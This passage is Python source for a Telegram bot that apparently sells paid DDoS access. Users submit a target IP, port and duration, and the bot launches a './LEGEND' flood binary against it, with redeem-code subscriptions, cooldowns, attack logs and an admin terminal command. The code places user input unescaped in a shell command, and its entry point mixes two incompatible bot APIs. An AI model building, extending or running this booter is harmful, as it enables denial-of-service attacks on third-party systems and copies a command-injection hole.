            remaining_time = COOLDOWN_PERIOD - elapsed_time
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
                parse_mode='Markdown'
            )
            return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Validate IP prefix
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid IP prefix. Only specific IP ranges are allowed.*", parse_mode='Markdown')
        return

    # Check if the user has already attacked this IP and port combination
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port*", parse_mode='Markdown')
        return

    try:
        duration = int(duration)

        # Retrieve the max attack time from the database
        max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
        max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else DEFAULT_MAX_ATTACK_TIME

        # Check if the duration exceeds the maximum allowed attack time
        if duration > max_attack_time:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.*", parse_mode='Markdown')
            return

    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be an integer representing seconds.*", parse_mode='Markdown')
        return

    # Continue with the attack logic (already implemented in your code)
    argument_type = settings_collection.find_one({"setting": "argument_type"})
    argument_type = argument_type["value"] if argument_type else 3  # Default to 3 if not set

    # Retrieve byte size and thread count from the database
    byte_size = settings_collection.find_one({"setting": "byte_size"})
    threads = settings_collection.find_one({"setting": "threads"})

    byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
    threads = threads["value"] if threads else DEFAULT_THREADS

    # Determine the attack command based on the argument type
    if argument_type == 3:
        attack_command = f"./LEGEND {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./LEGEND {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./LEGEND {ip} {port} {duration} {byte_size} {threads}"

    # Send attack details to the user
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    # Log the attack to the database
    await log_attack(user_id, ip, port, duration)

    # Run the attack using the appropriate command
    asyncio.create_task(run_attack(chat_id, attack_command, context))

    # Update the last attack time for the user and record the IP and port
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))

# Command to view the attack history of a user
async def view_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view attack logs!*", parse_mode='Markdown')
        return

    # Ensure the correct number of arguments are provided
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /log <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])

    # Retrieve attack logs for the user
    attack_logs = attack_logs_collection.find({"user_id": target_user_id})
    if attack_logs_collection.count_documents({"user_id": target_user_id}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user.*", parse_mode='Markdown')
        return

    # Display the logs in a formatted way
    logs_text = "*User Attack History:*\n"
    for log in attack_logs:
        # Convert UTC timestamp to local timezone
        local_timestamp = log['timestamp'].replace(tzinfo=timezone.utc).astimezone(LOCAL_TIMEZONE)
        formatted_time = local_timestamp.strftime('%Y-%m-%d %I:%M %p')  # Format to 12-hour clock without seconds
        
        # Format each entry with labels on separate lines
        logs_text += (
            f"IP: {log['ip']}\n"
            f"Port: {log['port']}\n"
            f"Duration: {log['duration']} sec\n"
            f"Time: {formatted_time}\n\n"
        )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=logs_text, parse_mode='Markdown')

# Command to delete the attack history of a user
async def delete_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to delete attack logs!*", parse_mode='Markdown')
        return

    # Ensure the correct number of arguments are provided
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /delete_log <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])

    # Delete attack logs for the specified user
    result = attack_logs_collection.delete_many({"user_id": target_user_id})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Deleted {result.deleted_count} attack log(s) for user {target_user_id}.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user to delete.*", parse_mode='Markdown')


async def run_attack(chat_id, attack_command, context):
    try:
        process = await asyncio.create_subprocess_shell(
            attack_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

# Function to generate a redeem code with a specified redemption limit and optional custom code name
async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to generate redeem codes!*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=(
                "*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*\n"
                "example: /gen paiduser 1d 1"
            ),
            parse_mode='Markdown'
        )
        return

    # Default values
    max_uses = 1
    custom_code = None

    # Determine if the first argument is a time value or custom code
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        # First argument is time, generate a random code
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        # First argument is custom code
        custom_code = time_input
        if len(context.args) < 2:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="*⚠️ Please provide a duration (e.g., 1d or 30m) after the custom code.*",
                parse_mode='Markdown'
            )
            return
        time_input = context.args[1]
        redeem_code = custom_code

    # Check if a time value was provided
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please specify time in days (d) or minutes (m).*",
            parse_mode='Markdown'
        )
        return

    # Calculate expiration time
    try:
        if time_input[-1].lower() == 'd':  # Days
            time_value = int(time_input[:-1])
            expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
            expiry_label = f"{time_value} day(s)"
        elif time_input[-1].lower() == 'm':  # Minutes
            time_value = int(time_input[:-1])
            expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
            expiry_label = f"{time_value} minute(s)"
    except ValueError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Invalid time format. Use like `1d` or `30m`.*",
            parse_mode='Markdown'
        )
        return

    # Set max_uses if provided
    try:
        if custom_code:
            if len(context.args) > 2:
                max_uses = int(context.args[2])
        else:
            if len(context.args) > 1:
                max_uses = int(context.args[1])
    except ValueError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please provide a valid number for max uses.*",
            parse_mode='Markdown'
        )
        return

    # Insert the redeem code into your database
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],
        "max_uses": max_uses,
        "redeem_count": 0
    })

    # Send success message
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=message,
        parse_mode='Markdown'
    )


# Function to redeem a code with a limited number of uses
async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return

    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness

    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return

    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return

    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return

    # Update the user's expiry date
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    # Mark the redeem code as used by adding user to `used_by`, incrementing `redeem_count`
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )

    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

# Function to delete redeem codes based on specified criteria
async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to delete redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    # Check if a specific code is provided as an argument
    if len(context.args) > 0:
        # Get the specific code to delete
        specific_code = context.args[0]

        # Try to delete the specific code, whether expired or not
        result = redeem_codes_collection.delete_one({"code": specific_code})
        
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*⚠️ Code `{specific_code}` not found.*", 
                parse_mode='Markdown'
            )
    else:
        # Delete only expired codes if no specific code is provided
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})

        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ No expired codes found to delete.*", 
                parse_mode='Markdown'
            )

# Function to list redeem codes
async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view redeem codes!*", parse_mode='Markdown')
        return

    # Check if there are any documents in the collection
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No redeem codes found.*", parse_mode='Markdown')
        return

    # Retrieve all codes
    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"
    
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code['expiry_date']
        
        # Ensure expiry_date is timezone-aware
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        
        # Format expiry date to show only the date (YYYY-MM-DD)
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        
        # Calculate the remaining time
        time_diff = expiry_date - current_time
        remaining_minutes = time_diff.total_seconds() // 60  # Get the remaining time in minutes
        
        # Avoid showing 0.0 minutes, ensure at least 1 minute is displayed
        remaining_minutes = max(1, remaining_minutes)  # If the remaining time is less than 1 minute, show 1 minute
        
        # Display the remaining time in a more human-readable format
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440  # Days = minutes // 1440
            remaining_hours = (remaining_minutes % 1440) // 60  # Hours = (minutes % 1440) // 60
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"
        
        # Determine whether the code is valid or expired
        if expiry_date > current_time:
            status = "✅"
        else:
            status = "❌"
            remaining_time = "(Expired)"
        
        message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

# Function to check if a user is allowed
async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def cleanup(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to perform this action!*", parse_mode='Markdown')
        return

    # Get the current UTC time
    current_time = datetime.now(timezone.utc)

    # Find users with expired expiry_date
    expired_users = users_collection.find({"expiry_date": {"$lt": current_time}})

    expired_users_list = list(expired_users)  # Convert cursor to list

    if len(expired_users_list) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No expired users found.*", parse_mode='Markdown')
        return

    # Remove expired users from the database
    for user in expired_users_list:
        users_collection.delete_one({"_id": user["_id"]})

    # Notify admin
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Cleanup Complete!*\n*Removed {len(expired_users_list)} expired users.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("argument", set_argument))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("set_time", set_max_attack_time))
    application.add_handler(CommandHandler("log", view_attack_log))  # Add this handler
    application.add_handler(CommandHandler("delete_log", delete_attack_log))
    application.add_handler(CommandHandler("upload", upload))
    application.add_handler(CommandHandler("ls", list_files))
    application.add_handler(CommandHandler("delete", delete_file))
    application.add_handler(CommandHandler("terminal", execute_terminal))
    application.add_handler(CommandHandler("status", check_status))

    application.run_polling()

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")

